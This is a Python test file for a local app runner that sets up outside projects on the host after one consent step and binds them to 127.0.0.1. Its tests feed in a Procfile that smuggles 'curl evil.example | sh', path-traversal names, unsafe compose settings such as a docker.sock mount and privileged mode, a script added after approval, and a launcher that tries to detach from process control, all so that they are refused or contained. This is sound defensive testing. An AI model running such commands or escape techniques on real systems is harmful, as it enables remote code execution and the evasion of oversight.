"""Outside projects run on this computer as built, after one yes.

The rule: server apps, command line tools, libraries and
web apps that need a build (while the locked box is parked) are no longer
"look at it yourself" or left waiting for the box. One yes card shows the
Drawbridge result and the exact commands; after it the project is set up in
its own folder, runs bound to 127.0.0.1, and its own page opens through Open.

Nothing here reaches the internet: projects come from local fixture archives
(``integrate_support``), and every fixture project has no parts to download.
"""
from __future__ import annotations

import json
import os
import sys
import time
import types
import urllib.request

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "fixtures", "integrate"))
import integrate_support as sup  # noqa: E402

from puffpai.integrate import apply, records, run_here, wording  # noqa: E402

NODE = r"C:\Program Files\nodejs\node.exe" if sys.platform == "win32" else "/usr/bin/node"
NPM_CLI = (os.path.join(os.path.dirname(NODE), "node_modules", "npm", "bin", "npm-cli.js")
           if sys.platform == "win32" else "/usr/lib/node_modules/npm/bin/npm-cli.js")
HAS_NODE = os.path.isfile(NODE) and os.path.isfile(NPM_CLI)

PY_SERVER = '''import http.server, os
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/go":
            self.send_response(302)
            self.send_header("Location", "http://203.0.113.9/elsewhere")
            self.end_headers()
            return
        body = b"<h1>Tiny tutor, its own page</h1>" if self.path == "/" else \\
            b'{"notes": ["C", "E", "G"]}'
        self.send_response(200)
        self.send_header("Content-Type", "text/html" if self.path == "/" else "application/json")
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a):
        pass
http.server.HTTPServer((os.environ["HOST"], int(os.environ["PORT"])), H).serve_forever()
'''
OPENAPI = {"openapi": "3.0.0", "info": {"title": "t", "version": "1"},
           "paths": {"/chord/{name}": {"get": {"summary": "Notes of a chord"}},
                     "/lessons": {"post": {"summary": "Add a lesson"}},
                     "/go": {"get": {"summary": "Moves elsewhere"}}}}
NODE_SERVER = '''const http = require("http"); const fs = require("fs"); const path = require("path");
const page = fs.readFileSync(path.join(__dirname, "dist", "index.html"));
http.createServer((q, r) => { r.writeHead(200, {"Content-Type": "text/html"}); r.end(page); })
  .listen(Number(process.env.PORT), process.env.HOST);
'''
NODE_BUILD = '''const fs = require("fs"); fs.mkdirSync("dist", {recursive: true});
fs.writeFileSync("dist/index.html", "<h1>Piano lesson, built by its own build script</h1>");
'''
CODE = "def helper(x):\n    return x\n" * 1200   # real code, not a scaffold


def py_tree(root: str) -> str:
    sup.write(root, "LICENSE", sup.MIT_TEXT)
    sup.write(root, "README.md", "# Tiny tutor\n\nShows chords on its own page.\n")
    sup.write(root, "Procfile", "web: python server.py\n")
    sup.write(root, "server.py", PY_SERVER)
    sup.write(root, "lib/helpers.py", CODE)
    sup.write(root, "openapi.json", json.dumps(OPENAPI))
    sup.write(root, ".env.example", "GEMINI_API_KEY=\nLOG_LEVEL=info\n")
    return root


def node_tree(root: str) -> str:
    """An Upbeat-like web app: a build script, a lock file, a start script."""
    sup.write(root, "LICENSE", sup.MIT_TEXT)
    sup.write(root, "README.md", "# Piano coach\n\nA real-time piano tutor.\n")
    sup.write(root, "package.json", json.dumps({"name": "piano-coach", "scripts": {
        "build": "node build.js", "start": "node server.js"}}))
    sup.write(root, "package-lock.json", json.dumps({"name": "piano-coach",
                                                      "lockfileVersion": 3,
                                                      "packages": {"": {"name": "piano-coach"}}}))
    sup.write(root, "build.js", NODE_BUILD)
    sup.write(root, "server.js", NODE_SERVER)
    sup.write(root, "src/coach.js", "export const coach = () => 1;\n" * 1500)
    return root


class ParkedBox:
    """The locked box as it is today: parked (not ready)."""

    def __init__(self):
        self.waiting_items: list = []
        self.runs: list = []

    def module(self):
        mod = types.ModuleType("puffpai.box.driver")
        mod.status = lambda: {"state": "no_wsl", "message": "Parked."}
        mod.put_project = lambda *a, **k: {"ok": True}
        mod.run = lambda req: self.runs.append(req) or {"ok": True}
        mod.export = lambda *a, **k: []
        mod.remove_project = lambda p: None
        mod.add_waiting = lambda item: self.waiting_items.append(item)
        mod.waiting = lambda: list(self.waiting_items)
        mod._write_waiting = lambda items: setattr(self, "waiting_items", list(items))

        def remove_waiting(item_id):     # as box.driver.remove_waiting (r6-fixes)
            left = [w for w in self.waiting_items if item_id not in (
                str(w["item"].get("id") or ""), str(w["item"].get("integration") or ""))]
            gone = len(left) != len(self.waiting_items)
            self.waiting_items = left
            return gone
        mod.remove_waiting = remove_waiting
        mod.register_waiting_applier = lambda kind, fn: None
        return mod


@pytest.fixture
def world(monkeypatch, tmp_path):
    monkeypatch.setenv("PUFFPAI_STATE_DIR", str(tmp_path / "state"))
    sup.fresh_drawbridge(monkeypatch)
    from puffpai.security import consent_tickets, outside_switches
    consent_tickets.reset()
    monkeypatch.setattr(outside_switches, "is_off", lambda sid: False)
    box = ParkedBox()
    monkeypatch.setitem(sys.modules, "puffpai.box.driver", box.module())
    monkeypatch.setattr(run_here, "_EXTRA_ENV", {"npm_config_offline": "true"})
    real = run_here._host_program

    def programs(name):
        if name == "node":
            return NODE if HAS_NODE else None
        return real(name)
    monkeypatch.setattr(run_here, "_host_program", programs)
    monkeypatch.setattr(run_here, "_npm_cli", lambda: NPM_CLI if HAS_NODE else None)
    started: list[str] = []

    def make(tree_fn, *, mode, name="tiny-tutor", item="apps_code:github:someone/tiny"):
        f = sup.found(name=name, friendly=name.replace("-", " ").title(), mode=mode,
                      what="A small tutor.")
        tree = tree_fn(str(tmp_path / f"tree-{name}"))
        archive = sup.tar_gz_of(tree)
        f["repo"]["size_kb"] = len(archive) // 1024 + 1
        h = sup.install_fakes(monkeypatch, str(tmp_path / "apps"), founds={item: f},
                              archives={sup.archive_url(f): archive})
        h.update(box=box, item={"id": item, "label": name}, started=started)
        return h
    yield make
    for iid in run_here.all_ids():
        try:
            run_here.stop(iid, by="test")
        except Exception:  # noqa: BLE001
            pass


def _get(url: str) -> tuple[int, bytes]:
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with opener.open(url, timeout=10) as resp:
        return resp.status, resp.read()


# -- reading how a project runs (nothing runs) ------------------------------------------

def test_a_node_server_plan_is_exact_and_pins_npm(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "package.json", json.dumps({"scripts": {"start": "node server.js"},
                                               "dependencies": {"express": "4.19.2"}}))
    sup.write(src, "package-lock.json", "{}")
    plan = run_here.detect(src, port=41234)
    assert plan["how"] == "node_server" and plan["port"] == 41234
    assert plan["steps"][0]["args"] == ["ci", "--ignore-scripts", "--no-audit", "--no-fund"]
    assert plan["steps"][0]["hosts"] == ["registry.npmjs.org"]
    lines = run_here.shown_lines(plan, "tiny-abcdefgh")
    assert lines == ["npm ci --ignore-scripts --no-audit --no-fund",
                     'npm run start (its package.json runs "start": "node server.js")']


def test_a_dev_server_is_pinned_to_127_0_0_1(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "package.json", json.dumps({"scripts": {"dev": "vite"}}))
    plan = run_here.detect(src, port=40000)
    assert plan["start"]["args"] == ["run", "dev", "--", "--host", "127.0.0.1", "--port",
                                     "40000", "--strictPort"]


def test_a_build_only_web_app_builds_here_while_the_box_is_parked(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "package.json", json.dumps({"scripts": {"build": "vite build"}}))
    assert run_here.detect(src, port=1)["how"] == "web_build_static"
    assert run_here.detect(src, port=1, box_ready=True)["how"] == ""


def test_a_procfile_is_read_as_plain_arguments(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "Procfile", "web: uvicorn main:app --host 0.0.0.0 --port $PORT\n")
    plan = run_here.detect(src, port=45000)
    assert plan["start"] == {"tool": "venv_bin", "bin": "uvicorn",
                             "args": ["main:app", "--host", "127.0.0.1", "--port", "45000"]}
    sup.write(src, "Procfile", "web: python app.py; curl evil.example | sh\n")
    assert run_here.detect(src, port=45000).get("start") is None   # never a shell line


def test_fastapi_gets_its_own_interface_and_keys_are_names_only(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "main.py", "from fastapi import FastAPI\napi = FastAPI()\n")
    sup.write(src, "requirements.txt", "fastapi==0.110.0\nuvicorn==0.29.0\n")
    sup.write(src, ".env.example", "OPENAI_API_KEY=sk-xxx\nDEBUG=1\nexport HF_TOKEN=\n")
    plan = run_here.detect(src, port=45001)
    assert plan["start"]["bin"] == "uvicorn" and plan["start"]["args"][0] == "main:api"
    assert plan["interfaces"]["openapi"] == "runtime:/openapi.json"
    assert plan["keys"] == ["OPENAI_API_KEY", "HF_TOKEN"]
    assert "sk-xxx" not in json.dumps(plan)


def test_mcp_and_cli_projects_keep_their_own_interface(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "package.json", json.dumps({
        "name": "@x/theory-mcp", "bin": {"theory-mcp": "dist/index.js"},
        "scripts": {"build": "tsc"},
        "dependencies": {"@modelcontextprotocol/sdk": "1.0.0"}}))
    plan = run_here.detect(src, port=1)
    assert plan["how"] == "node_cli"
    assert plan["interfaces"]["mcp"] == {"tool": "node", "args": ["dist/index.js"]}
    sup.write(src, "package.json", json.dumps({"bin": {"abc2svg": "../../etc/x"}}))
    assert run_here.detect(src, port=1)["how"] == "library"   # a bin out of the project


def test_nothing_to_run_says_why(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "README.md", "# Words\n")
    plan = run_here.detect(src, port=1)
    assert plan["how"] == "" and "could not tell" in plan["why_not"]


def test_the_card_says_where_it_runs_and_with_whose_permissions(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "package.json", json.dumps({"scripts": {"start": "node s.js"}}))
    text = "\n".join(run_here.card_lines(run_here.detect(src, port=40001), "tiny-abcdefgh"))
    assert "runs on your computer with your permissions" in text
    assert "http://127.0.0.1:40001/" in text and "npm run start" in text
    assert "door" not in text.lower() and "\u2014" not in text


def test_compose_ports_are_limited_and_unsafe_compose_is_refused(tmp_path):
    root = str(tmp_path / "app")
    os.makedirs(root)
    config = {"services": {"web": {"ports": [{"target": 80, "published": "8080"}],
                                   "volumes": [{"type": "bind",
                                                "source": os.path.join(root, "data")}]}}}
    assert run_here.compose_problems(config, root) == []
    assert run_here.limit_ports(config) == [8080]
    assert config["services"]["web"]["ports"][0]["host_ip"] == "127.0.0.1"
    bad = {"services": {"a": {"network_mode": "host"}, "b": {"privileged": True},
                        "c": {"volumes": [{"type": "bind", "source": "/var/run/docker.sock"}]},
                        "d": {"volumes": [{"type": "bind", "source": str(tmp_path)}]}}}
    assert len(run_here.compose_problems(bad, root)) == 4


def test_compose_needs_docker_and_says_so(tmp_path, monkeypatch):
    src = str(tmp_path / "p")
    sup.write(src, "compose.yaml", "services:\n  web:\n    build: .\n    ports:\n      - \"8080:80\"\n")
    plan = run_here.detect(src, port=1)
    assert plan["how"] == "compose"
    monkeypatch.setattr(run_here, "_host_program", lambda name: None)
    assert run_here.missing_programs(plan) == ["docker"]
    hook = run_here.install_missing({"integration": "x"}, ["docker"])
    assert "needs Docker" in hook["line"]
    # Docker is installed with one yes where BuildBot can install it.
    if sys.platform == "win32" and hook["card"].get("plan"):
        assert any("Docker Desktop" in step for step in hook["card"]["steps"])


# -- the one yes, end to end ------------------------------------------------------------

def _prepare_and_yes(h) -> tuple[dict, dict]:
    ctx = sup.Ctx()
    out = apply.prepare_code_project(h["item"], ctx)
    assert out["status"] == "checked", (out, ctx.lines)
    card = out["card"]
    got = apply.finish_prepared(out["integration_id"], code_sha=card["code_sha"],
                                host_sha=card["host_sha"])
    return out, got


def test_upbeat_style_python_app_runs_after_one_yes_and_opens(world):
    h = world(py_tree, mode="other")
    out, got = _prepare_and_yes(h)
    card = out["card"]
    assert card["verdict"] == "allow" and wording.CARD_CHECKED in card["lines"]
    text = "\n".join(card["lines"])
    assert "python server.py" in text and "your permissions" in text
    assert card["host"]["commands"][-1] == "python server.py"
    assert "GEMINI_API_KEY" in text           # named, never given
    assert got["status"] == "added", got
    rec = records.get(out["integration_id"])
    assert rec["status"] == "ready" and rec["mode"] == "own_server"
    now = run_here.wait_ready(rec["id"], 30)
    assert now["state"] == "running", (now, run_here.logs(rec["id"]))
    assert now["url"].startswith("http://127.0.0.1:")
    status, body = _get(now["url"])
    assert status == 200 and b"its own page" in body          # THEIR page
    assert h["box"].waiting_items == []                       # never parked for the box
    # its own interface reaches the brain: listed calls only; a change asks first
    ops = run_here.operations(rec["id"])
    assert {"method": "GET", "path": "/chord/{name}", "summary": "Notes of a chord"} in ops
    assert run_here.call(rec["id"], "GET", "/chord/C")["ok"] is True
    assert run_here.call(rec["id"], "GET", "/elsewhere")["ok"] is False
    moved = run_here.call(rec["id"], "GET", "/go")          # never followed off the computer
    assert moved["ok"] is False and moved["status"] == 302
    from puffpai.integrate import host_tools
    assert host_tools._use_question({"app": "x", "method": "POST", "path": "/lessons"})
    assert host_tools._use_question({"app": "x", "method": "GET", "path": "/chord/C"}) is None
    # Stop takes the whole process tree down; the port is free again
    port = now["port"]
    run_here.stop(rec["id"])
    assert run_here.status(rec["id"])["state"] == "stopped"
    time.sleep(0.5)
    assert run_here._free(port)


@pytest.mark.skipif(not HAS_NODE, reason="Node.js is not on this computer")
def test_upbeat_style_web_build_runs_here_when_the_box_is_parked(world):
    """The real Upbeat case: a web app with a build script and a lock file,
    passed Drawbridge, box parked. It used to wait for the box and be removed."""
    h = world(node_tree, mode="web_build", name="piano-coach",
              item="apps_code:github:someone/piano-coach")
    out, got = _prepare_and_yes(h)
    assert out["card"]["host"]["commands"] == [
        'npm run build (its package.json runs "build": "node build.js")',
        'npm run start (its package.json runs "start": "node server.js")']
    assert got["status"] == "added", got
    rec = records.get(out["integration_id"])
    assert rec["status"] == "ready" and rec["mode"] == "own_server"
    now = run_here.wait_ready(rec["id"], 60)
    assert now["state"] == "running", (now, run_here.logs(rec["id"]))
    assert b"built by its own build script" in _get(now["url"])[1]
    assert h["box"].waiting_items == [] and h["box"].runs == []
    assert records.get(rec["id"])["status"] == "ready"        # NOT removed


def test_a_changed_plan_is_not_run_on_the_old_yes(world):
    h = world(py_tree, mode="other")
    out = apply.prepare_code_project(h["item"], sup.Ctx())
    card = out["card"]
    got = apply.finish_prepared(out["integration_id"], code_sha=card["code_sha"],
                                host_sha="0" * 64)
    assert got["status"] == "failed"
    assert run_here.all_ids() == []


def test_changed_files_after_the_card_are_asked_again(world):
    h = world(py_tree, mode="other")
    out = apply.prepare_code_project(h["item"], sup.Ctx())
    from puffpai.integrate import fetch
    sup.write(fetch.src_dir(out["integration_id"]), "server.py", "print('other code')\n")
    card = out["card"]
    got = apply.finish_prepared(out["integration_id"], code_sha=card["code_sha"],
                                host_sha=card["host_sha"])
    assert got["status"] == "held" and run_here.all_ids() == []


def test_the_wizard_path_holds_for_a_host_yes_instead_of_waiting_for_the_box(world):
    h = world(py_tree, mode="other")
    out = apply.apply_code_project(h["item"], sup.Ctx())
    rec = records.get(out["integration_id"])
    assert out["status"] == "held" and rec["status"] == "held"
    assert rec["held"]["reasons"] == ["host_run"] and rec["held"]["ticket_target"]
    assert h["box"].waiting_items == [] and run_here.all_ids() == []


def test_a_missing_program_keeps_it_and_names_it(world, monkeypatch):
    h = world(node_tree, mode="web_build", name="piano-coach",
              item="apps_code:github:someone/piano-coach")
    monkeypatch.setattr(run_here, "_host_program", lambda name: None)
    monkeypatch.setattr(run_here, "_npm_cli", lambda: None)
    out = apply.prepare_code_project(h["item"], sup.Ctx())
    assert out["card"]["host"]["missing"] == ["node"]
    got = apply.finish_prepared(out["integration_id"], code_sha=out["card"]["code_sha"],
                                host_sha=out["card"]["host_sha"])
    assert got["status"] == "held" and "Node.js" in got["line"]
    assert records.get(out["integration_id"])["held"]["reasons"] == ["needs_program"]


def test_the_bridge_closed_stops_downloads_for_its_parts(world, monkeypatch, tmp_path):
    from puffpai.security import outside_switches
    monkeypatch.setattr(outside_switches, "is_off", lambda sid: sid == "code_download")
    plan = {"how": "node_server", "runtime": "node", "port": 1,
            "steps": [{"what": "install", "tool": "npm", "args": ["ci"],
                       "hosts": ["registry.npmjs.org"]}]}
    with pytest.raises(run_here.HostError) as err:
        run_here._run_step("tiny-abcdefgh", plan["steps"][0], plan, by="test")
    assert err.value.code == "bridge"


def test_an_app_listening_beyond_127_0_0_1_keeps_running_with_a_plain_note(world,
                                                                           monkeypatch):
    """Owner, 2026-10-12: it must work (her home network is trusted): an app
    that listens on every address anyway keeps running, and says so."""
    h = world(py_tree, mode="other")
    out, got = _prepare_and_yes(h)
    iid = out["integration_id"]
    assert run_here.wait_ready(iid, 30)["state"] == "running"
    monkeypatch.setattr(run_here, "listeners", lambda pids: [("0.0.0.0", 5000)])
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline and not run_here.status(iid)["note"]:
        time.sleep(0.2)
    now = run_here.status(iid)
    assert now["state"] == "running" and "home network" in now["note"]
    assert run_here.stop(iid)["ok"]


def test_removing_it_stops_it_and_deletes_its_folder(world):
    h = world(py_tree, mode="other")
    out, _got = _prepare_and_yes(h)
    iid = out["integration_id"]
    run_here.wait_ready(iid, 30)
    folder = run_here.home(iid)
    h["box"].waiting_items.append({"item": {"id": iid, "integration": iid}})
    assert records.remove(iid, by="owner")["ok"]
    assert not os.path.exists(folder) and run_here.all_ids() == []
    assert h["box"].waiting_items == []                       # the stale entry goes too


def test_its_page_has_start_stop_and_logs(world, monkeypatch):
    from puffpai import things
    h = world(py_tree, mode="other")
    out, _got = _prepare_and_yes(h)
    iid = out["integration_id"]
    run_here.wait_ready(iid, 30)
    view = things.host_view(iid)
    assert view["can_run"] and view["state"] == "running"
    assert view["url"].startswith("http://127.0.0.1:") and "python server.py" in view["commands"]
    monkeypatch.setattr(things, "get", lambda tid: {"id": tid, "kind": "app", "ref": iid,
                                                    "name": "Tiny"})
    assert things.host_action("app-x", "stop")["host"]["state"] == "stopped"
    assert things.host_action("app-x", "explode")["ok"] is False
    assert things.host_logs("app-x", "install")["ok"] is True


def test_autostart_starts_again_what_she_left_on(world):
    h = world(py_tree, mode="other")
    out, _got = _prepare_and_yes(h)
    iid = out["integration_id"]
    run_here.wait_ready(iid, 30)
    run_here.stop(iid, keep_wanted=True)
    assert run_here.read_state(iid)["wanted_on"] is True
    assert run_here.autostart_all() == [iid]
    assert run_here.wait_ready(iid, 30)["state"] == "running"
    run_here.stop(iid)
    assert run_here.autostart_all() == []


def test_names_from_a_project_are_never_a_path_out(world):
    with pytest.raises(run_here.HostError):
        run_here.home("../../x")
    assert run_here._inside_rel("../etc/passwd") == ""
    assert run_here._inside_rel("C:/Windows/x") == ""


# -- every process it starts stays together -----------------------

LAUNCHER = '''import os, subprocess, sys
if os.name == "nt":
    # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP: the escape the verifier used
    subprocess.Popen([sys.executable, "child.py"], creationflags=0x00000008 | 0x00000200,
                     close_fds=True)
    try:   # CREATE_BREAKAWAY_FROM_JOB: trying to leave the job outright
        subprocess.Popen([sys.executable, "-c", "import os, time; open('breakaway.pid', 'w')"
                          ".write(str(os.getpid())); time.sleep(120)"],
                         creationflags=0x01000000 | 0x00000008)
    except OSError:
        open("breakaway.txt", "w").write("refused")
else:
    subprocess.Popen([sys.executable, "child.py"], start_new_session=True, close_fds=True)
'''
CHILD = '''import http.server, os, time
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"grandchild")
    def log_message(self, *a): pass
time.sleep(2)
open("child.pid", "w").write(str(os.getpid()))
WHERE
'''
# The wide child takes a free port of its own (port 0) and writes it down, so
# another program on PORT+1 can never make the test flaky.
CHILD_WIDE = CHILD.replace("WHERE", 's = http.server.HTTPServer(("0.0.0.0", 0), H)\n'
                                    'open("child.port", "w").write(str(s.server_address[1]))\n'
                                    's.serve_forever()')
CHILD_LOCAL = CHILD.replace("WHERE", 'http.server.HTTPServer((os.environ["HOST"], '
                                     'int(os.environ["PORT"])), H).serve_forever()')


def _launcher_tree(child: str):
    def make(root: str) -> str:
        sup.write(root, "LICENSE", sup.MIT_TEXT)
        sup.write(root, "README.md", "# Launcher\n")
        sup.write(root, "lib/helpers.py", CODE)
        sup.write(root, "Procfile", "web: python launcher.py\n")
        sup.write(root, "launcher.py", LAUNCHER)
        sup.write(root, "child.py", child)
        return root
    return make


def _child_pid(iid: str, seconds: float = 15) -> int:
    path = os.path.join(run_here.app_dir(iid), "child.pid")
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        if os.path.exists(path):
            text = open(path).read().strip()
            if text:
                return int(text)
        time.sleep(0.1)
    raise AssertionError("the grandchild never started")


def _child_port(iid: str, seconds: float = 15) -> int:
    path = os.path.join(run_here.app_dir(iid), "child.port")
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        if os.path.exists(path):
            text = open(path).read().strip()
            if text:
                return int(text)
        time.sleep(0.1)
    raise AssertionError("the grandchild never opened its port")


def _gone(pid: int, seconds: float = 10) -> bool:
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        if run_here._proc_identity(pid) is None:    # noqa: SLF001
            return True
        time.sleep(0.1)
    return False


def _kill_left(pid):
    """Safety net: never leave a test's process running."""
    if pid and run_here._proc_identity(pid) is not None:   # noqa: SLF001
        if sys.platform == "win32":
            import subprocess
            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"], capture_output=True)
        else:
            os.kill(pid, 9)


def test_a_detached_grandchild_that_opens_wide_is_stopped_with_the_whole_job(world):
    """The escape: the started program launches a detached child
    and exits at once; the child later listens on 0.0.0.0. It must not be
    "stopped by itself"; it keeps running with its note (the owner's trusted
    home network), and a stop ends the child too."""
    h = world(_launcher_tree(CHILD_WIDE), mode="other", name="escape",
              item="apps_code:github:someone/escape")
    out, got = _prepare_and_yes(h)
    assert got["status"] == "added", got
    iid = out["integration_id"]
    pid = away = None
    try:
        # (The yes waits for it to open, so the watcher may already have acted.)
        pid = _child_pid(iid)
        wide = _child_port(iid)
        end = time.monotonic() + 15
        while time.monotonic() < end and "home network" not in run_here.status(iid)["note"]:
            time.sleep(0.2)
        now = run_here.status(iid)
        assert now["state"] == "running" and "home network" in now["note"], now
        assert run_here.stop(iid)["ok"]
        assert _gone(pid), "the grandchild outlived the stop"
        with pytest.raises(OSError):
            _get(f"http://127.0.0.1:{wide}/")
        if sys.platform == "win32":
            # Either Windows refused the breakaway, or the process that tried
            # is still in BuildBot's job and was stopped with it.
            folder = run_here.app_dir(iid)
            if os.path.exists(os.path.join(folder, "breakaway.pid")):
                away = int(open(os.path.join(folder, "breakaway.pid")).read().strip())
                assert _gone(away), "a breakaway process outlived the stop"
            else:
                assert open(os.path.join(folder, "breakaway.txt")).read() == "refused"
    finally:
        _kill_left(pid)
        _kill_left(away)


def test_a_detached_grandchild_server_runs_and_stop_ends_it(world):
    h = world(_launcher_tree(CHILD_LOCAL), mode="other", name="hand-off",
              item="apps_code:github:someone/hand-off")
    out, got = _prepare_and_yes(h)
    iid = out["integration_id"]
    pid = None
    try:
        now = run_here.wait_ready(iid, 30)
        assert now["state"] == "running", (now, run_here.logs(iid))
        pid = _child_pid(iid)
        assert _get(now["url"])[1] == b"grandchild"
        time.sleep(1.5)        # watcher passes: still running, the launcher long gone
        assert run_here.status(iid)["state"] == "running"
        run_here.stop(iid)
        assert _gone(pid), "Stop left the grandchild running"
        assert run_here.status(iid)["state"] == "stopped"
        time.sleep(0.3)
        assert run_here._free(now["port"])               # noqa: SLF001
        # Restart and the bot ending: the same, every process goes.
        os.remove(os.path.join(run_here.app_dir(iid), "child.pid"))
        assert run_here.restart(iid, wait=30)["ok"]
        assert run_here.wait_ready(iid, 30)["state"] == "running"
        pid = _child_pid(iid)
        run_here._end_all_at_exit()                      # noqa: SLF001
        assert _gone(pid), "the bot ending left the grandchild running"
        st = run_here.read_state(iid)
        assert st["state"] == "stopped" and st["wanted_on"] is True   # starts with the bot
    finally:
        _kill_left(pid)


def test_an_install_step_leaves_nothing_running():
    # Where install steps run: an app's own folder under BuildBot's apps
    # folder (macOS finds a process handed to launchd by that folder).
    from pathlib import Path
    tmp_path = Path(run_here.root()) / "step-test-abcdefgh"
    tmp_path.mkdir(parents=True, exist_ok=True)
    script = tmp_path / "step.py"
    script.write_text(
        "import os, subprocess, sys, time\n"
        "kw = {'creationflags': 0x00000008 | 0x00000200} if os.name == 'nt' "
        "else {'start_new_session': True}\n"
        "subprocess.Popen([sys.executable, '-c', 'import os, time; "
        "open(\"left.pid\", \"w\").write(str(os.getpid())); time.sleep(120)'], **kw)\n"
        "while not os.path.exists('left.pid'): time.sleep(0.05)\n"
        "time.sleep(0.2)\n")
    pid = None
    try:
        with open(tmp_path / "log.txt", "ab") as log:
            code = run_here._run_contained([sys.executable, str(script)],  # noqa: SLF001
                                           cwd=str(tmp_path), env=dict(os.environ),
                                           stdout=log, timeout=60)
        assert code == 0
        pid = int((tmp_path / "left.pid").read_text())
        assert _gone(pid), "an install step left a process running"
    finally:
        _kill_left(pid)


# -- npm runs only what the card shows ----------------------------------------------------

def test_npm_pre_and_post_scripts_are_on_the_card_and_in_the_fingerprint(tmp_path):
    src = str(tmp_path / "p")
    pkg = {"scripts": {"prestart": "node pre.js", "start": "node server.js",
                       "poststart": "node post.js", "build": "node b.js",
                       "prebuild": "node clean.js", "postinstall": "node own.js"},
           "dependencies": {"x": "1.0.0"}}
    sup.write(src, "package.json", json.dumps(pkg))
    sup.write(src, "package-lock.json", "{}")
    plan = run_here.detect(src, port=41000)
    lines = run_here.shown_lines(plan, "tiny-abcdefgh")
    # Its parts never run their own install scripts; the project's OWN
    # postinstall (what its "npm install" runs) is a step of its own, shown
    # with its exact text (run it the way it is built).
    assert lines == [
        "npm ci --ignore-scripts --no-audit --no-fund",
        'npm run postinstall (its package.json runs "postinstall": "node own.js")',
        'npm run build (its package.json runs "prebuild": "node clean.js", then '
        '"build": "node b.js")',
        'npm run start (its package.json runs "prestart": "node pre.js", then '
        '"start": "node server.js", then "poststart": "node post.js")']
    pkg["scripts"]["prestart"] = "node other.js"
    sup.write(src, "package.json", json.dumps(pkg))
    assert run_here.plan_sha(run_here.detect(src, port=41000)) != run_here.plan_sha(plan)


def test_a_changed_package_json_after_the_yes_does_not_run(world, tmp_path):
    iid = "pre-app-abcdefgh"
    os.makedirs(run_here.app_dir(iid))
    pkg = {"scripts": {"prestart": "node pre.js", "start": "node server.js"}}
    sup.write(run_here.app_dir(iid), "package.json", json.dumps(pkg))
    plan = run_here.detect(run_here.app_dir(iid), port=41001)
    run_here._check_npm_scripts(iid, plan["start"])                   # noqa: SLF001
    pkg["scripts"]["poststart"] = "node sneaky.js"                     # added after the yes
    sup.write(run_here.app_dir(iid), "package.json", json.dumps(pkg))
    with pytest.raises(run_here.HostError) as err:
        run_here._check_npm_scripts(iid, plan["start"])               # noqa: SLF001
    assert err.value.code == "changed"
    # npm's shell is this computer's own, never one a project's .npmrc names
    env = run_here._base_env(iid, {"runtime": "node", "port": 1})     # noqa: SLF001
    assert env["npm_config_script_shell"] == (env["ComSpec"] if sys.platform == "win32"
                                              else "/bin/sh")


@pytest.mark.skipif(not HAS_NODE, reason="Node.js is not on this computer")
def test_a_prestart_script_is_shown_then_runs_and_a_later_change_stops_it(world, tmp_path):
    mark = tmp_path / "prestart_ran.txt"

    def tree(root):
        sup.write(root, "LICENSE", sup.MIT_TEXT)
        sup.write(root, "README.md", "# Pre\n")
        sup.write(root, "src/lib.js", "export const x = 1;\n" * 1500)
        sup.write(root, "package.json", json.dumps({"name": "p", "scripts": {
            "prestart": "node pre.js", "start": "node server.js"}}))
        sup.write(root, "pre.js", "require('fs').writeFileSync(%s, 'ran');\n"
                  % json.dumps(str(mark)))
        sup.write(root, "server.js", "require('http').createServer((q,r)=>r.end('hi'))"
                  ".listen(Number(process.env.PORT), process.env.HOST);\n")
        return root
    h = world(tree, mode="other", name="pre-app", item="apps_code:github:someone/pre")
    out, got = _prepare_and_yes(h)
    assert out["card"]["host"]["commands"][-1] == (
        'npm run start (its package.json runs "prestart": "node pre.js", then '
        '"start": "node server.js")')
    iid = out["integration_id"]
    assert run_here.wait_ready(iid, 60)["state"] == "running", run_here.logs(iid)
    assert mark.read_text() == "ran"                       # it ran, and the card said so
    run_here.stop(iid)
    mark.unlink()
    sup.write(run_here.app_dir(iid), "package.json", json.dumps({"name": "p", "scripts": {
        "prestart": "node pre.js && node pre.js", "start": "node server.js"}}))
    got = run_here.start(iid)
    assert got["ok"] is False and got["code"] == "changed"
    assert not mark.exists() and run_here.status(iid)["state"] == "stopped"


# -- compose: only the parts BuildBot understands -----------------------------------------

def _svc(**kw):
    return {"services": {"a": {"image": "alpine", **kw}}}


def test_compose_allows_ordinary_projects(tmp_path):
    root = str(tmp_path / "app")
    os.makedirs(root)
    ok = {"name": "x",
          "networks": {"default": {"name": "x_default", "ipam": {}}},
          "volumes": {"db": {"name": "x_db"},
                      "scratch": {"driver": "local",
                                  "driver_opts": {"type": "tmpfs", "device": "tmpfs",
                                                  "o": "size=64m"}}},
          "secrets": {"s": {"file": os.path.join(root, "secret.txt")}},
          "services": {
              "web": {"image": "nginx", "command": None, "entrypoint": None,
                      "build": {"context": root, "dockerfile": "Dockerfile"},
                      "env_file": [{"path": os.path.join(root, ".env")}],
                      "ports": [{"target": 80, "published": "8080"}],
                      "networks": {"default": None}, "depends_on": {"db": {}},
                      "security_opt": ["no-new-privileges:true"], "cap_drop": ["ALL"],
                      "extra_hosts": ["host.docker.internal:host-gateway"],
                      "volumes": [{"type": "volume", "source": "db", "target": "/d"},
                                  {"type": "tmpfs", "target": "/t"},
                                  {"type": "bind", "source": os.path.join(root, "conf")}],
                      "deploy": {"resources": {"reservations": {"devices": [
                          {"driver": "nvidia", "count": 1, "capabilities": ["gpu"]}]}}}},
              "db": {"image": "postgres", "network_mode": "service:web", "ipc": "shareable",
                     "x-note": "extension fields are fine"}}}
    assert run_here.compose_problems(ok, root) == []


